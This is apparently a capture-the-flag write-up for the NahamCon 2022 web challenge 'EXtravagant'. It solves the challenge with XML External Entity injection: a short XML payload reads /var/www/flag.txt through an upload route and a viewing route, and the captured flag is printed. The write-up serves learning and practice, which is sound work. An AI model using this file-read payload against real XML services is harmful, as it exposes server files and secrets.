# NahamCon CTF 2022: EXtravagant

Category: Web

Points: 50

## Description

> I've been working on a XML parsing service. It's not finished but there should be enough for you to try out. The flag is in /var/www

## Summary

For this challenge we can abuse XML External Entity (XXE) to read the contents of a file. We need to upload a xml with our payload and then view the file to see the flag. 

## Flag

```
flag{639b72f2dd0017f454c44c3863c4e195}
```

## Detailed Solution

We can use the following code to read the contents of the flag. (foo and bar can be any string)

```xml
( CONTENTS OF VULN.XML )

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/www/flag.txt"> ]>
<bar>&xxe;</bar>
```

Now let's try to upload the xml file. This can be done by using the /trial route. After uploading the xml file we can view the contents of the file using the /XML route.
```
[HOST]:[PORT]/XML?file=vuln.xml
```
Our flag is read from the file vuln.xml and is returned for us to view.

---
[Back to home](../../README.md)
